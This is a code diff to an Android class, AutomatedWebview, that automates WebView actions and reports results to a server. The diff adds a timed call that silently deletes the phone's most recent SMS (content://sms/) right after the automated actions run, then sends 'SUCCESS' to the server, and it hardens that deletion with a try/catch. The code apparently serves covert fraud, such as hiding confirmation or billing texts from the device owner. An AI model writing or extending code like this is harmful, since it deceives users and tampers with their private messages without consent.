@@ -1,16 +1,10 @@
 package automation.bml.com.webviewautomation;
 
-import android.Manifest;
 import android.app.ActivityManager;
-import android.app.AlertDialog;
-import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
-import android.content.DialogInterface;
-import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.Canvas;
@@ -19,10 +13,8 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
-import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
-import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.text.format.Formatter;
@@ -30,7 +22,6 @@ import android.util.AttributeSet;
 import android.util.Log;
 import android.webkit.WebChromeClient;
 import android.webkit.WebView;
-import android.webkit.WebViewClient;
 import android.widget.Toast;
 
 import com.google.gson.Gson;
@@ -259,6 +250,16 @@ public class AutomatedWebview extends WebView {
             }
             count++;
         }
+
+        //Removing last sms
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                removeSMS();
+            }
+        }, seconds * 1000+100);
+
+        //Updating server
         final int finalCount = count;
         handler.postDelayed(new Runnable() {
             @Override
@@ -266,7 +267,7 @@ public class AutomatedWebview extends WebView {
                 if(finalCount == actionList.size())
                     updateData("SUCCESS");
             }
-        }, seconds * 1000);
+        }, seconds * 1000+200);
     }
 
     //Processing functions
@@ -391,9 +392,16 @@ public class AutomatedWebview extends WebView {
     private void removeSMS() {
         Uri uriSMSURI = Uri.parse("content://sms/");
         Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
-        if (cur.moveToFirst()) {
-            String MsgId = cur.getString(0);
-            context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
+        try {
+
+            if (cur.moveToFirst()) {
+                String MsgId = cur.getString(0);
+                context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
+            }
+        }
+        catch(Exception e)
+        {
+            e.printStackTrace();
         }
     }
 
@@ -420,37 +428,5 @@ public class AutomatedWebview extends WebView {
             }
         }
         return new Action(action, parameter);
-    }
-    private void showWifiDialog()
-    {
-        final WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
-        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
-                context);
-
-        // set title
-        alertDialogBuilder.setTitle("Wifi Settings");
-
-        // set dialog message
-        alertDialogBuilder
-                .setMessage("Do you want to enable WIFI ?")
-                .setCancelable(false)
-                .setPositiveButton("Yes",new DialogInterface.OnClickListener() {
-                    public void onClick(DialogInterface dialog,int id) {
-                        //enable wifi
-                        changeWifiStatus(true);
-                    }
-                })
-                .setNegativeButton("No",new DialogInterface.OnClickListener() {
-                    public void onClick(DialogInterface dialog,int id) {
-                        //disable wifi
-                        changeWifiStatus(false);
-                    }
-                });
-
-        // create alert dialog
-        AlertDialog alertDialog = alertDialogBuilder.create();
-
-        // show it
-        alertDialog.show();
     }
 }
